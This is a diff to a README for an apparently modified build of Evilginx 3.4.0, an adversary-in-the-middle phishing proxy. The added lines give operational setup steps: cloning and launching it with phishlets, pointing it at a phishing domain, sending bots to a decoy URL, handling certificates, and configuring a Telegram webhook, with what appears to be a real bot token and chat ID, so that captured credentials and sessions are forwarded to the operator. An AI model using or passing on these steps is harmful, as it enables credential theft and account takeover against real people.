@@ -21,6 +21,43 @@ Alternative video url:
 https://www.flexclip.com/editor/app?id=9e89b4e3509603d00d53064b8058bcd1
 
 
+How to install ?
+
+On Ubuntu:
+
+1. git clone https://github.com/EvilHoster/evilginx-3.4.0-telegram-modification
+2. cd evilginx-3.4.0-telegram-modification
+3. cd build
+4. chmod +rwx evilginx
+5. ./evilginx -p ../phishlets/
+
+Setup your configuration.
+
+1. config domain something.com
+2. cofig ipv4 external serverip
+3. config ipv4 bind serverip
+4. config unauth_url https://bots.here.redirected.com/
+5. config autocert off/on
+
+[ if ON free certificates is used, it can rate-limit your domain if u ask too much. ]
+[ If OFF 
+- Feature: Added support to load custom TLS certificates from a public certificate file and a private key file stored in `~/.evilginx/crt/sites/<hostname>/`. Will load `fullchain.pem` and `privkey.pem` pair or a combination of a `.pem`/`.crt` (public certificate) and a `.key` (private key) file. Make sure to run without `-developer` flag and disable autocert retrieval with `config autocert off`.
+}
+
+
+6.config webhook_telegram 7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y/-15604540645
+
+7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y is a Token from Bot Father.
+-15604540645 is a Chat ID inside your group.
+
+Add to your Telegram group https://t.me/raw_data_bot and your Group Chat ID will be displayed.
+
+
+
+
+
+
+
 ## Help
 
 In case you want to learn how to install and use **Evilginx**, please refer to online documentation available at:
